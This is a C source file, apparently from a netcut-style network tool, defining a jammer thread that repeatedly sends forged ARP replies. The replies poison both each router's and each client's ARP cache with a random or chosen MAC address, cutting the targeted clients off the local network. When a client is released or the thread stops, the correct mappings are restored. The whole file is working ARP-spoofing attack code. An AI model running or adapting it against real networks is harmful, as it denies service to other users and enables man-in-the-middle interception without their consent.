#include "./process/jammer.h"

#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>

#ifdef _WIN32
#include <winsock2.h>
#else
#include <arpa/inet.h>
#endif

#include "./network/arp.h"
#include "./network/network.h"
#include "network/device.h"
#include "network/forgery.h"
#include "platform/compat.h"
#include "platform/thread_compat.h"

void *jammer_process(void *arg) {
    jammer_args_t *args = (jammer_args_t *)arg;
    network_t *network = args->network;
    atomic_bool *stop_flag = args->stop_flag;

    network_socket_t network_socket = args->network_socket;

    int cleanup = 3;
    while (cleanup) {
        uint8_t sender_mac[6];
        if (atomic_load(&args->opts->use_real_mac))
            runtime_options_get_program_mac(args->opts, sender_mac);
        else
            network_forgery_mac(sender_mac);

        pthread_mutex_lock(&network->lock);
        for (size_t i = 0; i < network->length; i++) {
            device_t *device_router = &network->devices[i];
            if (device_router->role != DEVICE_ROLE_ROUTER) {
                continue;
            }
            uint32_t router_ip = htonl(device_router->ip);

            for (size_t y = 0; y < network->length; y++) {
                device_t *device_client = &network->devices[y];
                if (device_client->role != DEVICE_ROLE_CLIENT) {
                    continue;
                }

                uint32_t device_ip = htonl(device_client->ip);
                device_state_t state = device_client->state;
                if (device_client->jamming) {
                    arp_send_reply(&network_socket, device_router->mac, sender_mac, device_ip,
                                   device_router->mac, router_ip);
                    arp_send_reply(&network_socket, device_client->mac, sender_mac, router_ip,
                                   device_client->mac, device_ip);
                } else if (state == DEVICE_STATE_DISCONNECTING) {
                    arp_send_reply(&network_socket, device_router->mac, device_client->mac,
                                   device_ip, device_router->mac, router_ip);
                    arp_send_reply(&network_socket, device_client->mac, device_router->mac,
                                   router_ip, device_client->mac, device_ip);
                }
            }
        }
        if (atomic_load(stop_flag)) {
            cleanup--;
        }
        pthread_mutex_unlock(&network->lock);

        platform_sleep_sec(2);
    }
    return NULL;
}
